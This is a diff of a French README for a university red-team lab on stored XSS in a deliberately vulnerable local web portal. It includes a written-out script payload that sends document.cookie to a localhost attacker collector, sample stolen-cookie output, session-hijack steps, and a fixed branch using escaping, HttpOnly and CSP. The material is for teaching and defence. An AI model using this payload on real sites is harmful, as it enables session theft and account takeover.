@@ -1,176 +1,175 @@
-# P01 — XSS Stocké · Plateforme Universitaire UniPortail
+# 🛡️ Lab_cyber — XSS Stocké & Vol de Cookie de Session
 
-**EMINES UM6P · Benguerir · 2026 — Red Team**
+**EMINES – Université Mohammed VI Polytechnique · Benguerir · 2026**  
+**Cours Cybersécurité – Projet P01 – Red Team**
 
-> ⚠️ Application volontairement vulnérable — usage pédagogique uniquement.
-> Voir [DISCLAIMER.md](DISCLAIMER.md).
-
-
-Les deux applications
-🎯 Application cible — app/
-Il s'agit d'une plateforme universitaire fictive UniPortail, simulant un environnement réel avec trois niveaux de rôles (Administrateur, Professeur, Étudiant). Elle contient une vulnérabilité XSS stockée intentionnelle dans le module de messagerie : les messages ne sont ni filtrés à l'enregistrement ni échappés à l'affichage, ce qui permet l'injection de code JavaScript malveillant.
-Accessible sur : http://localhost:8080
-💀 Serveur attaquant — attacker-server/
-Il s'agit du Command & Control (C2) de l'attaquant. Il reçoit et affiche les cookies de session volés via le payload XSS. C'est ici que l'attaquant récupère le PHPSESSID de la victime pour usurper son identité.
-Accessible sur : http://localhost:8888
-```
-
-## 👥 Hiérarchie des rôles
-
-| Rôle | Accès |
-|------|-------|
-| **Administrateur** | Tableau de bord global, gestion des utilisateurs, toutes les notes, messagerie |
-| **Professeur** | Notes de tous les étudiants, emploi du temps, messagerie |
-| **Étudiant** | Ses propres notes, emploi du temps, messagerie |
+> ⚠️ **Usage pédagogique uniquement.** Ce laboratoire contient une application volontairement vulnérable dans un environnement strictement local et contrôlé. Voir [`DISCLAIMER.md`](./DISCLAIMER.md).
 
 ---
 
-## 🚀 Lancement (< 5 minutes)
+## 🎯 Objectif
+
+Démontrer comment une vulnérabilité **XSS Stocké** dans une messagerie interne peut être exploitée pour **voler le cookie de session d'un administrateur** et usurper son identité — sans jamais connaître son mot de passe.
+
+---
+
+## ⚔️ Deux branches, deux états
+
+Ce dépôt est organisé autour de **deux branches** qui représentent deux états opposés de l'application :
+
+### 🔴 Branche `main` — Application vulnérable (Attaque)
+
+La plateforme universitaire **UniPortail** dans son état **non sécurisé**. Elle contient une faille XSS Stockée intentionnelle dans la messagerie interne : les messages sont stockés en base de données sans encodage et restitués sans filtrage dans la page HTML, ce qui permet l'injection de code JavaScript malveillant.
+
+Un attaquant disposant d'un simple compte étudiant peut envoyer un message piégé à l'administrateur. Dès que l'admin ouvre ce message, son cookie de session est exfiltré silencieusement vers le serveur attaquant (`attacker-server/`).
+
+```bash
+git checkout main
+```
+
+### 🟢 Branche `fixed-xss` — Application corrigée (Contre-attaque)
+
+La même application, cette fois **sécurisée par une défense en profondeur** :
+
+| Correction | Détail |
+|---|---|
+| **Sanitisation des entrées** | `html.escape()` encode les caractères dangereux avant stockage |
+| **Encodage des sorties** | Suppression du filtre `\| safe` dans les templates Jinja2 |
+| **Cookie `HttpOnly`** | JavaScript ne peut plus lire `document.cookie` — le vol devient impossible |
+| **Cookie `Secure` + `SameSite`** | Protection complémentaire contre les attaques réseau et CSRF |
+| **Content Security Policy (CSP)** | Seuls les scripts du même domaine sont autorisés à s'exécuter |
+
+```bash
+git checkout fixed-xss
+```
+
+---
+
+## 🏗️ Architecture
+
+```
+Lab_cyber/
+├── app/                    ← Plateforme universitaire UniPortail (Python/Flask)
+│   ├── app.py              ← Serveur principal + routes
+│   ├── templates/          ← Templates Jinja2
+│   └── ...
+├── attacker-server/        ← Serveur attaquant C2
+│   └── cookie_stealer.py   ← Collecteur de cookies (port 8000)
+├── db/
+│   └── init.sql            ← Schéma + données de test
+├── docker-compose.yml
+└── DISCLAIMER.md
+```
+
+---
+
+## 👥 Comptes de test
+
+| Rôle | Email | Mot de passe |
+|---|---|---|
+| Administrateur | admin@uni.ma | Admin@2026 |
+| Étudiant 1 | kalami@uni.ma | Etud@2026 |
+| Étudiant 2 | fchraibi@uni.ma | Etud@2026 |
+
+---
+
+## 🚀 Installation & Lancement
 
 ### Prérequis
 
-- Docker Desktop installé et démarré
-- Ports libres : `8080` (app), `8888` (attaquant), `3306` (MySQL)
+- [Docker Desktop](https://www.docker.com/products/docker-desktop/) installé et **démarré**
+- Ports libres : `8080` (application), `8000` (serveur attaquant), `3306` (MySQL)
 
-### Commandes
+### Lancer l'application vulnérable (branche `main`)
 
 ```bash
-# 1. Cloner / décompresser le projet
-cd p01-xss-universite
+# 1. Cloner le dépôt
+git clone https://github.com/BilalJaouad/Lab_cyber.git
+cd Lab_cyber
 
-# 2. Construire et lancer tous les conteneurs
+# 2. S'assurer d'être sur la branche principale
+git checkout main
+
+# 3. Construire et démarrer les conteneurs
 docker compose up --build -d
 
-# 3. Attendre ~15 secondes que MySQL démarre, puis ouvrir :
-#    Application :  http://localhost:8080
-#    Attaquant C2 : http://localhost:8888
+# 4. Attendre ~15 secondes, puis ouvrir :
+#    Application  →  http://localhost:8080
+#    Attaquant C2 →  http://localhost:8000
+```
+
+### Lancer l'application corrigée (branche `fixed-xss`)
+
+```bash
+git checkout fixed-xss
+docker compose up --build -d
 ```
 
 ### Arrêt
 
 ```bash
-docker compose down          # Arrêter
-docker compose down -v       # Arrêter + supprimer les données
+docker compose down       # Arrêter les conteneurs
+docker compose down -v    # Arrêter + supprimer les données
 ```
 
 ---
 
-## 🔑 Comptes de test
+## 🔬 La Kill Chain (branche `main`)
 
-| Rôle | Email | Mot de passe |
-|------|-------|-------------|
-| Administrateur | admin@uni.ma | Admin@2026 |
-| Professeur 1 | ybenali@uni.ma | Prof@2026 |
-| Professeur 2 | souali@uni.ma | Prof@2026 |
-| Étudiant 1 | kalami@uni.ma | Etud@2026 |
-| Étudiant 2 | fchraibi@uni.ma | Etud@2026 |
-| Étudiant 3 | oidrissi@uni.ma | Etud@2026 |
-
----
-
-## 🎯 Démonstration de l'attaque XSS Stocké
-
-### Où se trouve la vulnérabilité ?
-
-Dans `app/messagerie.php`, le corps du message est affiché **sans échappement** :
-
-```php
-// ⚠️ VULNÉRABLE — ligne ~111 de messagerie.php
-<div class="message-body">
-  <?= $currentMsg['corps'] ?>   ← pas de htmlspecialchars() !
-</div>
+```
+(1) Injection → (2) Stockage → (3) Exécution → (4) Exfiltration → (5) Usurpation
 ```
 
-Le contenu est aussi stocké sans filtre :
-
-```php
-$stmt->execute([$uid, $dest_id, htmlspecialchars($sujet), $corps]);
-//                                                          ^^^^^ pas de sanitisation
+**Étape 1 — Préparation**
+Lancer le serveur attaquant depuis `attacker-server/` :
+```bash
+python cookie_stealer.py
+# [*] Serveur attaquant en écoute sur le port 8000...
 ```
 
-### Scénario de démonstration
-
-**Étape 1 — Préparation (Attaquant)**
-
-1. Ouvrir le C2 attaquant : `http://localhost:8888`
-2. Se connecter sur l'app en tant qu'**étudiant** : `kalami@uni.ma / Etud@2026`
-
-**Étape 2 — Injection du payload**
-
-3. Aller dans **Messagerie → Nouveau message**
-4. Destinataire : `Admin Système`
-5. Sujet : `Question importante`
-6. Corps du message — coller ce payload :
-
+**Étape 2 — Injection**
+Se connecter en tant qu'étudiant (`kalami@uni.ma`) et envoyer ce message à l'Admin :
 ```html
-Bonjour,
-
-J'ai une question concernant mes notes du semestre 1.
-
 <script>
-var img = new Image();
-img.src = "http://localhost:8888/collect?c=" + encodeURIComponent(document.cookie);
+  new Image().src = 'http://127.0.0.1:8000/steal?c=' + document.cookie;
 </script>
-
-Cordialement,
-Karim Alami
 ```
 
-7. Cliquer **Envoyer**
+**Étape 3 — Exécution**
+L'administrateur ouvre sa messagerie → le script s'exécute silencieusement dans son navigateur.
 
-**Étape 3 — Déclenchement (Victime)**
+**Étape 4 — Exfiltration**
+Le terminal du serveur attaquant affiche :
+```
+[!] COOKIE VOLÉ
+[+] Valeur : APP_SID=eyJhbGciOiJIUzI1NiJ9.xyz
+[+] IP source : 192.168.1.42
+```
 
-8. Ouvrir un **nouvel onglet en navigation privée**
-9. Se connecter en tant qu'**admin** : `admin@uni.ma / Admin@2026`
-10. Aller dans **Messagerie**
-11. Ouvrir le message de Karim Alami
-
-→ Le script s'exécute dans le navigateur de l'admin.
-
-**Étape 4 — Vérification**
-
-12. Revenir sur `http://localhost:8888`
-13. Le cookie de session admin apparaît dans "Cookies collectés"
-
-**Étape 5 — Usurpation de session**
-
-14. Dans le navigateur de l'attaquant, ouvrir `http://localhost:8080`
-15. DevTools (F12) → Application → Cookies → `http://localhost:8080`
-16. Modifier `PHPSESSID` avec la valeur volée
-17. Rafraîchir → l'attaquant est maintenant connecté en tant qu'**admin** 🔓
+**Étape 5 — Usurpation**
+Dans le navigateur de l'attaquant : `F12` → Console → injecter le cookie :
+```javascript
+document.cookie = "APP_SID=eyJhbGciOiJIUzI1NiJ9.xyz; path=/";
+```
+Rafraîchir → **l'attaquant est connecté en tant qu'admin** 🔓
 
 ---
 
-## 🔬 Analyse technique
+## 🔒 Pourquoi `HttpOnly` bloque l'attaque (branche `fixed-xss`)
 
-### Pourquoi ça fonctionne ?
+| | Sans `HttpOnly` ❌ | Avec `HttpOnly` ✅ |
+|---|---|---|
+| `document.cookie` | Retourne `APP_SID=abc123` | Retourne `""` (vide) |
+| Exfiltration | Possible | **Impossible** |
+| Usurpation | Réussie | **Bloquée** |
 
-1. **Stockage non filtré** : le payload JavaScript est enregistré tel quel en BDD
-2. **Affichage non échappé** : `echo $row['corps']` injecte directement le HTML
-3. **Cookie accessible** : pas de flag `HttpOnly` sur la session PHP
-
-### Correctif (non appliqué — intentionnellement)
-
-```php
-// ✅ VERSION SÉCURISÉE (à NE PAS implémenter dans P01)
-echo htmlspecialchars($currentMsg['corps'], ENT_QUOTES, 'UTF-8');
-// + php.ini : session.cookie_httponly = 1
-// + CSP header : Content-Security-Policy: script-src 'self'
+```python
+# Branche fixed-xss — Configuration sécurisée
+app.config['SESSION_COOKIE_HTTPONLY'] = True  # Bloque document.cookie
+app.config['SESSION_COOKIE_SECURE']   = True  # HTTPS uniquement
+app.config['SESSION_COOKIE_SAMESITE'] = 'Lax' # Protection anti-CSRF
 ```
 
 ---
 
-## 📦 Livrables
 
-- [x] Code source versionné
-- [x] README d'installation (< 5 min)
-- [x] `docker-compose.yml` avec 3 services
-- [x] Base de données initialisée avec données fictives
-- [x] Serveur collecteur de cookies (C2)
-- [x] `DISCLAIMER.md`
-- [ ] Rapport PDF (à rédiger séparément)
-- [ ] Présentation (à préparer séparément)
-
----
-
-*Projet P01 · Red Team · XSS Stocké · EMINES UM6P · 2026*
